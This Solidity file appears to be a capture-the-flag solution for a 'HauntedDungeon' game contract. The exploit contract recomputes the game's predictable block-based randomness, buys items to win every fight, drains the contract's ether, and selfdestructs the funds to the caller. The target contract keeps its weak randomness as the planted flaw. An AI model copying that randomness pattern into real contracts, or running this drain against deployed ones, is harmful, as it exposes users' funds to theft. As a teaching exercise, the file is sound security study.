// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_luksgrin {
    function enterDungeon() external payable;
}

contract Exploit_luksgrin {
    HauntedDungeon instance;

    constructor(IChallenge_luksgrin _instance) payable {
        // instance = _instance;
        instance = new HauntedDungeon{value: 1 ether}();
    }

    function finalize() external payable {
        instance.enterDungeon{value: 0.1 ether}();
        // combatting false

        do {
            decide();
            instance.turn();
        } while (address(instance).balance > 0);

        // instance.turn();
        // reach currentFloor > 5

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}

    function decide() internal {
        uint256 currentFloor = instance.currentFloor(address(this));
        uint256 nextFloor = instance.combatting(address(this)) ? 0 : 1;
        nextFloor += currentFloor;

        console.log("\n\n new turn");
        console.log("current %d, nex %d", currentFloor, nextFloor);
        int256[5] memory baseStats = [int256(1), int256(3), int256(5), int256(7), int256(50)];
        string[5] memory shopItems = ["lifePotion", "dmgPotion", "defPotion", "leechBlood", "mntnDew"];

        int256 ma;
        int256 md;
        int256 a;
        int256 d;

        if (currentFloor != nextFloor) {
            ma = ((int256(random()) % 10) + baseStats[nextFloor - 1]);
            md = 2 * (int256(random()) % 7) + baseStats[nextFloor - 1];
        } else {
            ma = instance.currentMnstr(address(this), 0);
            md = instance.currentMnstr(address(this), 1);
        }
        a = instance.attack(address(this));
        d = instance.defense(address(this));

        console.log("monster:");
        console.logInt(ma);
        console.logInt(md);

        console.log("me:");
        console.logInt(a);
        console.logInt(d);

        int256 lifes = instance.lives(address(this));
        int256 shops = int256(instance.storeAccessLimit(address(this)));
        int256 maxPotions = (lifes - 1) / 2;
        if (maxPotions > shops) {
            maxPotions = shops;
        }

        console.log("lifes / shops / maxPtions");
        console.logInt(maxPotions);

        if (md < 0 && a < ma && a < 100) {
            console.log("farming defense");
        } else if (a >= ma) {
            console.log("easy win");
        } else if (d >= md) {
            console.log("defending");
        } else if (a + 4 >= ma) {
            console.log("dmgPotion");
            instance.store{value: 1.2 ether}("dmgPotion");
        } else if (a + 12 * maxPotions >= ma) {
            // hale merry
            for (int256 i = 0; i < maxPotions; ++i) {
                console.log("mountain dew");
                instance.store{value: 0.2 ether}("mntnDew");
            }
        }
    }

    function random() private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, address(this))));
    }
}

contract HauntedDungeon {
    // Declare contract variables
    uint256 public treasure;
    bool private victory = false;
    address public owner;
    int256[5] private baseStats = [int256(1), int256(3), int256(5), int256(7), int256(50)];
    string[5] public shopItems = ["lifePotion", "dmgPotion", "defPotion", "leechBlood", "mntnDew"];
    mapping(address => bool) public insideDungeon;
    mapping(address => bool) public combatting;
    mapping(address => uint256) public currentFloor;
    mapping(address => int256[2]) public currentMnstr;
    mapping(address => int256) public lives;
    mapping(address => int256) public attack;
    mapping(address => int256) public defense;
    mapping(address => uint256) public spent;
    mapping(string => uint256) public prices;
    mapping(address => uint256) public storeAccessLimit;
    mapping(string => int8[3]) public effects;

    // Logs messages to player
    event Talk(address _to, string _text);

    // Initiate contract
    constructor() payable {
        // Set store items' prices
        prices[shopItems[0]] = 0.6 ether;
        prices[shopItems[1]] = 1.2 ether;
        prices[shopItems[2]] = 0.6 ether;
        prices[shopItems[3]] = 0.45 ether;
        prices[shopItems[4]] = 0.2 ether;

        // Set item's effects. Col 0 = life, Col 1 = atk, Col 2 = def
        effects[shopItems[0]] = [int8(4), int8(0), int8(0)];
        effects[shopItems[1]] = [int8(0), int8(4), int8(0)];
        effects[shopItems[2]] = [int8(0), int8(0), int8(2)];
        effects[shopItems[3]] = [int8(-2), int8(0), int8(8)];
        effects[shopItems[4]] = [int8(-2), int8(12), int8(-4)];

        // Set owner
        owner = msg.sender;
        // Set initial bounty. It should be 1 ether
        treasure = msg.value;
    }

    // Owner may increase bounty
    function increaseTreasure() public payable {
        require(msg.sender == owner, "Only the owner may increase the Treasure");
        treasure += msg.value;
    }

    // Checks whether player is currently alive
    modifier alive() {
        _;
        if (lives[msg.sender] <= 0) {
            insideDungeon[msg.sender] = false;
            combatting[msg.sender] = false;
            currentFloor[msg.sender] = 0;
            treasure += spent[msg.sender];
            spent[msg.sender] = 0;

            emit Talk(msg.sender, "You just died. Enter the Dungeon again if you dare");
        } else {
            emit Talk(msg.sender, "You survived somehow");
        }
    }

    // Checks whether exists a bounty
    modifier existsTreasure() {
        require(treasure > 0, "Someone already claimed the treasure! Try again later");
        _;
    }

    // Checks whether player has entered the Dungeon
    modifier checkInsideDungeon() {
        require(insideDungeon[msg.sender] == true, "To play, you must enter the dungeon");
        _;
    }

    // Checks that player is not in the middle of a combat
    modifier notCombat() {
        require(combatting[msg.sender] == false, "You can't do that! You're in the middle of a combat!");
        _;
    }

    // Generate pseudo random number
    function random() private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
    }

    // Enter the dungeon
    function enterDungeon() public payable existsTreasure {
        require(msg.value >= 0.1 ether, "You need to pay at least 0.1 ether to enter the Haunted Dungeon");
        treasure += msg.value;
        insideDungeon[msg.sender] = true;
        combatting[msg.sender] = false;
        storeAccessLimit[msg.sender] = 3;
        currentFloor[msg.sender] = 0;
        lives[msg.sender] = 3;
        attack[msg.sender] = 1;

        emit Talk(msg.sender, "Welcome to the Haunted Dungeon. Will you be able to conquer it?");
    }

    // Sets up the Dungeon's store
    function store(string memory _prod) public payable existsTreasure checkInsideDungeon {
        require(prices[_prod] == msg.value, "Incorrect amount of funds provided to buy that product");
        require(storeAccessLimit[msg.sender] > 0, "You entered the store too many times! Store is closed now");

        lives[msg.sender] += effects[_prod][0];
        attack[msg.sender] += effects[_prod][1];
        defense[msg.sender] += effects[_prod][2];
        storeAccessLimit[msg.sender] -= 1;
        spent[msg.sender] += msg.value;
    }

    // Reduce player stats (they get tired) and recover their health
    function restore() private {
        lives[msg.sender] = 3;
        attack[msg.sender] /= 2;
        defense[msg.sender] /= 2;
        storeAccessLimit[msg.sender] += (1 + currentFloor[msg.sender]);
    }

    // Enter a new floow
    function enterFloor() private existsTreasure notCombat returns (bool) {
        currentFloor[msg.sender] += 1;

        if (currentFloor[msg.sender] > 5) {
            console.log("won");
            payable(msg.sender).transfer(treasure);
            treasure = 0;
            emit Talk(msg.sender, "Congratulations!  You conquered the Dungeon and took the treasure");
            insideDungeon[msg.sender] = false;
            storeAccessLimit[msg.sender] = 3;
            currentFloor[msg.sender] = 0;
            lives[msg.sender] = 3;
            attack[msg.sender] = 1;
            return (true);
        } else {
            console.log(currentFloor[msg.sender] - 1);
            currentMnstr[msg.sender] = [(int256(random()) % 10) + baseStats[currentFloor[msg.sender] - 1], 2 * (int256(random()) % 7) + baseStats[currentFloor[msg.sender] - 1]];

            emit Talk(msg.sender, "A monster appeared!");
            return (false);
        }
    }

    // Start a turn
    function turn() public existsTreasure checkInsideDungeon alive {
        if (!combatting[msg.sender]) {
            victory = enterFloor();
            if (!victory) {
                combatting[msg.sender] = true;
            }
        }

        if ((attack[msg.sender] >= currentMnstr[msg.sender][0]) && (!victory)) {
            console.log("won");
            emit Talk(msg.sender, "You killed the monster! You recover some of the money spent");

            restore();
            treasure += spent[msg.sender] / 2;
            payable(msg.sender).transfer(spent[msg.sender] / 2);
            spent[msg.sender] = 0;
            combatting[msg.sender] = false;
        } else if ((defense[msg.sender] >= currentMnstr[msg.sender][1]) && (!victory)) {
            console.log("defending");
            currentMnstr[msg.sender][0] -= attack[msg.sender];
            defense[msg.sender] -= currentMnstr[msg.sender][1];
        } else if (!victory) {
            console.log("losing a life");
            console.logInt(defense[msg.sender]);
            console.logInt(currentMnstr[msg.sender][1]);
            lives[msg.sender] -= (currentMnstr[msg.sender][1] - defense[msg.sender]);
        } else {
            victory = false;
        }
    }
}
